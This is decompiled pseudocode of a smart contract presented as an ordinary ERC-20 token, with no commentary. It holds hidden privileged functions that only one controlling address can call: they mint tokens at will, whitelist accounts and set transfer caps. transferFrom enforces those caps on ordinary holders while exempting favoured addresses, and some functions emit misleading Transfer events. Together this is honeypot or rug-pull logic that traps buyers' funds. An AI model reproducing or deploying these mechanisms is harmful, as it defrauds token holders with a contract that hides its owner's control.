contract main {




// =====================  Runtime code  =====================


#
#  - transfer(address arg1, uint256 arg2)
#
const decimals = 18

const owner = 57005


address stor0;
address stor1;
uint256 _totalFee;
address stor5;
address stor6;
address stor7;
address stor8;
mapping of uint256 stor9;
mapping of uint8 stor10;
uint256 stor11;
uint256 stor12;
uint256 stor13;
address stor14;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
address stor20;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function _totalFee() {
    return _totalFee
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function sub_c7077ef5(?) {
    require calldata.size - 4 >= 32
    require msg.sender == stor20
    balanceOf[stor20] += arg1
}

function sub_6083e94b(?) {
    require calldata.size - 4 >= 32
    require msg.sender == stor20
    stor10[address(arg1)] = 1
    return 1
}

function delegate(address arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == stor20
    stor14 = arg1
    return 1
}

function sub_89982c2d(?) {
    require calldata.size - 4 >= 64
    require msg.sender == stor20
    if arg2 > 0:
        stor12 = 10^18 * arg2
    else:
        stor12 = 0
    stor13 = arg1
    return 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferTo(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 == 100:
        emit Transfer((10^18 * arg2), 0, arg1);
    if arg2 > 0:
        balanceOf[address(arg1)] = 10^18 * arg2
    require msg.sender == stor5
    stor10[address(arg1)] = 1
    return 1
}

function batchSend(address[] arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    require msg.sender == stor20
    require balanceOf[address(msg.sender)] >= arg2 * arg1.length
    balanceOf[address(msg.sender)] += -1 * arg2 * arg1.length
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        _19 = mem[(32 * idx) + 128]
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 15
        balanceOf[mem[(32 * idx) + 140 len 20]] += arg2
        emit Transfer((arg2 / 2), msg.sender, mem[(32 * idx) + 140 len 20]);
        mem[(32 * arg1.length) + 128] = arg2 / 2
        emit Transfer((arg2 / 2), msg.sender, address(_19));
        idx = idx + 1
        continue 
    return 1
}

function sub_c2549e43(?) {
    require calldata.size - 4 >= 32
    if stor1 < this.address:
        if stor6 < this.address:
            if stor8 < this.address:
                if arg1 != stor20:
                    if stor20 != this.address:
                        if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if arg1 != address(sha3(0, stor7, sha3(stor8, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                if arg1 != address(sha3(0, stor0, sha3(stor6, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                    if arg1 != stor14:
                                        if arg1 != stor5:
                                            if not stor10[address(arg1)]:
                                                if not stor13:
                                                    if not stor11:
                                                        require stor12
                                                if stor13 > 0:
                                                    require stor9[address(arg1)] < stor13
                                                if stor11 > 0:
                                                    require stor11 <= 1
                                                if stor12 > 0:
                                                    require 1 <= stor12
            else:
                if arg1 != stor20:
                    if stor20 != this.address:
                        if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if arg1 != address(sha3(0, stor7, sha3(this.address, stor8), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                if arg1 != address(sha3(0, stor0, sha3(stor6, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                    if arg1 != stor14:
                                        if arg1 != stor5:
                                            if not stor10[address(arg1)]:
                                                if not stor13:
                                                    if not stor11:
                                                        require stor12
                                                if stor13 > 0:
                                                    require stor9[address(arg1)] < stor13
                                                if stor11 > 0:
                                                    require stor11 <= 1
                                                if stor12 > 0:
                                                    require 1 <= stor12
        else:
            if stor8 < this.address:
                if arg1 != stor20:
                    if stor20 != this.address:
                        if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if arg1 != address(sha3(0, stor7, sha3(stor8, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                if arg1 != address(sha3(0, stor0, sha3(this.address, stor6), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                    if arg1 != stor14:
                                        if arg1 != stor5:
                                            if not stor10[address(arg1)]:
                                                if not stor13:
                                                    if not stor11:
                                                        require stor12
                                                if stor13 > 0:
                                                    require stor9[address(arg1)] < stor13
                                                if stor11 > 0:
                                                    require stor11 <= 1
                                                if stor12 > 0:
                                                    require 1 <= stor12
            else:
                if arg1 != stor20:
                    if stor20 != this.address:
                        if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if arg1 != address(sha3(0, stor7, sha3(this.address, stor8), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                if arg1 != address(sha3(0, stor0, sha3(this.address, stor6), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                    if arg1 != stor14:
                                        if arg1 != stor5:
                                            if not stor10[address(arg1)]:
                                                if not stor13:
                                                    if not stor11:
                                                        require stor12
                                                if stor13 > 0:
                                                    require stor9[address(arg1)] < stor13
                                                if stor11 > 0:
                                                    require stor11 <= 1
                                                if stor12 > 0:
                                                    require 1 <= stor12
    else:
        if stor6 < this.address:
            if stor8 < this.address:
                if arg1 != stor20:
                    if stor20 != this.address:
                        if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if arg1 != address(sha3(0, stor7, sha3(stor8, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                if arg1 != address(sha3(0, stor0, sha3(stor6, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                    if arg1 != stor14:
                                        if arg1 != stor5:
                                            if not stor10[address(arg1)]:
                                                if not stor13:
                                                    if not stor11:
                                                        require stor12
                                                if stor13 > 0:
                                                    require stor9[address(arg1)] < stor13
                                                if stor11 > 0:
                                                    require stor11 <= 1
                                                if stor12 > 0:
                                                    require 1 <= stor12
            else:
                if arg1 != stor20:
                    if stor20 != this.address:
                        if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if arg1 != address(sha3(0, stor7, sha3(this.address, stor8), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                if arg1 != address(sha3(0, stor0, sha3(stor6, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                    if arg1 != stor14:
                                        if arg1 != stor5:
                                            if not stor10[address(arg1)]:
                                                if not stor13:
                                                    if not stor11:
                                                        require stor12
                                                if stor13 > 0:
                                                    require stor9[address(arg1)] < stor13
                                                if stor11 > 0:
                                                    require stor11 <= 1
                                                if stor12 > 0:
                                                    require 1 <= stor12
        else:
            if stor8 < this.address:
                if arg1 != stor20:
                    if stor20 != this.address:
                        if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if arg1 != address(sha3(0, stor7, sha3(stor8, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                if arg1 != address(sha3(0, stor0, sha3(this.address, stor6), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                    if arg1 != stor14:
                                        if arg1 != stor5:
                                            if not stor10[address(arg1)]:
                                                if not stor13:
                                                    if not stor11:
                                                        require stor12
                                                if stor13 > 0:
                                                    require stor9[address(arg1)] < stor13
                                                if stor11 > 0:
                                                    require stor11 <= 1
                                                if stor12 > 0:
                                                    require 1 <= stor12
            else:
                if arg1 != stor20:
                    if stor20 != this.address:
                        if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if arg1 != address(sha3(0, stor7, sha3(this.address, stor8), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                if arg1 != address(sha3(0, stor0, sha3(this.address, stor6), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                    if arg1 != stor14:
                                        if arg1 != stor5:
                                            if not stor10[address(arg1)]:
                                                if not stor13:
                                                    if not stor11:
                                                        require stor12
                                                if stor13 > 0:
                                                    require stor9[address(arg1)] < stor13
                                                if stor11 > 0:
                                                    require stor11 <= 1
                                                if stor12 > 0:
                                                    require 1 <= stor12
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if arg3:
        if arg1 != msg.sender:
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            allowance[address(arg1)][address(msg.sender)] -= arg3
        if stor1 < this.address:
            if stor6 < this.address:
                if stor8 < this.address:
                    if arg1 != stor20:
                        if arg2 != stor20:
                            if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor7, sha3(stor8, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(stor6, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor14:
                                            if arg1 != stor5:
                                                if not stor10[address(arg1)]:
                                                    if not stor13:
                                                        if not stor11:
                                                            require stor12
                                                    if stor13 > 0:
                                                        require stor9[address(arg1)] < stor13
                                                    if stor11 > 0:
                                                        require stor11 <= arg3
                                                    if stor12 > 0:
                                                        require arg3 <= stor12
                else:
                    if arg1 != stor20:
                        if arg2 != stor20:
                            if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor7, sha3(this.address, stor8), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(stor6, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor14:
                                            if arg1 != stor5:
                                                if not stor10[address(arg1)]:
                                                    if not stor13:
                                                        if not stor11:
                                                            require stor12
                                                    if stor13 > 0:
                                                        require stor9[address(arg1)] < stor13
                                                    if stor11 > 0:
                                                        require stor11 <= arg3
                                                    if stor12 > 0:
                                                        require arg3 <= stor12
            else:
                if stor8 < this.address:
                    if arg1 != stor20:
                        if arg2 != stor20:
                            if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor7, sha3(stor8, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(this.address, stor6), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor14:
                                            if arg1 != stor5:
                                                if not stor10[address(arg1)]:
                                                    if not stor13:
                                                        if not stor11:
                                                            require stor12
                                                    if stor13 > 0:
                                                        require stor9[address(arg1)] < stor13
                                                    if stor11 > 0:
                                                        require stor11 <= arg3
                                                    if stor12 > 0:
                                                        require arg3 <= stor12
                else:
                    if arg1 != stor20:
                        if arg2 != stor20:
                            if arg1 != address(sha3(0, stor0, sha3(stor1, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor7, sha3(this.address, stor8), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(this.address, stor6), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor14:
                                            if arg1 != stor5:
                                                if not stor10[address(arg1)]:
                                                    if not stor13:
                                                        if not stor11:
                                                            require stor12
                                                    if stor13 > 0:
                                                        require stor9[address(arg1)] < stor13
                                                    if stor11 > 0:
                                                        require stor11 <= arg3
                                                    if stor12 > 0:
                                                        require arg3 <= stor12
        else:
            if stor6 < this.address:
                if stor8 < this.address:
                    if arg1 != stor20:
                        if arg2 != stor20:
                            if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor7, sha3(stor8, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(stor6, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor14:
                                            if arg1 != stor5:
                                                if not stor10[address(arg1)]:
                                                    if not stor13:
                                                        if not stor11:
                                                            require stor12
                                                    if stor13 > 0:
                                                        require stor9[address(arg1)] < stor13
                                                    if stor11 > 0:
                                                        require stor11 <= arg3
                                                    if stor12 > 0:
                                                        require arg3 <= stor12
                else:
                    if arg1 != stor20:
                        if arg2 != stor20:
                            if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor7, sha3(this.address, stor8), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(stor6, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor14:
                                            if arg1 != stor5:
                                                if not stor10[address(arg1)]:
                                                    if not stor13:
                                                        if not stor11:
                                                            require stor12
                                                    if stor13 > 0:
                                                        require stor9[address(arg1)] < stor13
                                                    if stor11 > 0:
                                                        require stor11 <= arg3
                                                    if stor12 > 0:
                                                        require arg3 <= stor12
            else:
                if stor8 < this.address:
                    if arg1 != stor20:
                        if arg2 != stor20:
                            if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor7, sha3(stor8, this.address), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(this.address, stor6), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor14:
                                            if arg1 != stor5:
                                                if not stor10[address(arg1)]:
                                                    if not stor13:
                                                        if not stor11:
                                                            require stor12
                                                    if stor13 > 0:
                                                        require stor9[address(arg1)] < stor13
                                                    if stor11 > 0:
                                                        require stor11 <= arg3
                                                    if stor12 > 0:
                                                        require arg3 <= stor12
                else:
                    if arg1 != stor20:
                        if arg2 != stor20:
                            if arg1 != address(sha3(0, stor0, sha3(this.address, stor1), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                if arg1 != address(sha3(0, stor7, sha3(this.address, stor8), 0xfb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5)):
                                    if arg1 != address(sha3(0, stor0, sha3(this.address, stor6), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                                        if arg1 != stor14:
                                            if arg1 != stor5:
                                                if not stor10[address(arg1)]:
                                                    if not stor13:
                                                        if not stor11:
                                                            require stor12
                                                    if stor13 > 0:
                                                        require stor9[address(arg1)] < stor13
                                                    if stor11 > 0:
                                                        require stor11 <= arg3
                                                    if stor12 > 0:
                                                        require arg3 <= stor12
        require balanceOf[address(arg1)] >= arg3
        balanceOf[0] += arg3 / 100 * _totalFee
        balanceOf[address(arg1)] -= arg3
        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * _totalFee)
        stor9[address(arg1)]++
        emit Transfer(arg3, arg1, arg2);
        emit Transfer((arg3 / 100 * _totalFee), arg1, 0);
    return 1
}



}
